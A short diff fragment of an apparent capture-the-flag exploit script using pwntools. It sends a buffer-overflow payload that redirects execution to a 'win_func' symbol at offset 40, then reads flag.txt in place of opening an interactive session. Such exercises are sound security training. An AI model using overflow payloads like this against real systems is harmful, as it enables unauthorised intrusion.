@@ -58,4 +58,5 @@ offset = 40
 
 payload = fit({offset: exe.symbols['win_func']})
 io.sendline(payload)
-io.interactive()
+io.sendline("cat flag.txt")
+print(io.recv())
